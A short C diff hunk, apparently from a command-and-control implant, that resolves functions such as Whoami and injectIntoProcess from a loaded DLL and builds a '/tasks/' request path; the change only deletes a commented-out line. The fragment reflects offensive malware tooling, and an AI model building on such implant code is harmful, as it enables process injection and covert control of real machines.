@@ -641,7 +641,6 @@ void myMain()
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
     PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);
 
-    //WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
     WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
 
     CHAR* jsonResponse = NULL;
